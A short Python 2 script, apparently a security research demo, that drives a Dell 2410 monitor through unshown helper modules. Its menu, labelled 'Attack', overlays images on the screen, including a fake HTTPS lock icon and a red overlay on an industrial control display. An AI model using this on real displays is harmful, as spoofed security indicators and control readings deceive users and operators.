#!/usr/bin/python2
import protocol
import delltools
from image import DellImage


def upload_demo_images(dev):
    red_image = DellImage('red.gif')
    lock_image = DellImage('lock_https.gif')
    shak_image = DellImage('shak.gif')
    unicorn_image = DellImage('unicornFarts.gif')
    images = [red_image, lock_image, shak_image, unicorn_image]
    images_metainfo = delltools.all_images_upload(dev, images)
    return {
        'red': images_metainfo[0],
        'lock': images_metainfo[1],
        'shak': images_metainfo[2],
        'unicorn': images_metainfo[3]
    }


def red_hmi(dev, images):
    red_coordinate = (0x332, 0x21b)
    red_image_info = images['red']
    delltools.put_image(dev, red_image_info, red_coordinate[0], red_coordinate[1])


def put_ssl_lock(dev, images):
    lock_coordinate = (0x5e, 0x38)
    lock_image_info = images['lock']
    delltools.put_image(dev, lock_image_info, lock_coordinate[0], lock_coordinate[1])


def put_shak(dev, images):
    shak_coordinate = (0x60, 0x39)
    shak_image_info = images['shak']
    delltools.put_image(dev, shak_image_info, shak_coordinate[0], shak_coordinate[1])


def put_unicorn(dev, images):
    unicorn_coordinates = (0x60, 0x39)
    unicorn_image_info = images['unicorn']
    delltools.put_image(dev, unicorn_image_info, unicorn_coordinates[0], unicorn_coordinates[1])


def no_image(dev, images):
    delltools.clear_tile(dev)

if __name__ == "__main__":
    dell = protocol.Dell2410()
    dell.initialize()
    dell.debug_on()
    attack_funcs = {
        '1': put_unicorn,
        '2': put_ssl_lock,
        '3': put_shak,
        '4': red_hmi,
        '5': no_image
    }
    image_infos = upload_demo_images(dell)
    while True:
        attack = raw_input(
            'Enter a Attack Name:\t\n 1. Unicorn\n 2. Lock\n 3. Shak\n 4. HMI\n 5. Clear\n 6. Quit\n')
        if attack.rstrip(' ') == '6':
            break
        else:
            print 'Attack: %s' % (attack)
            attack_funcs[attack](dell, image_infos)
    dell.debug_off()
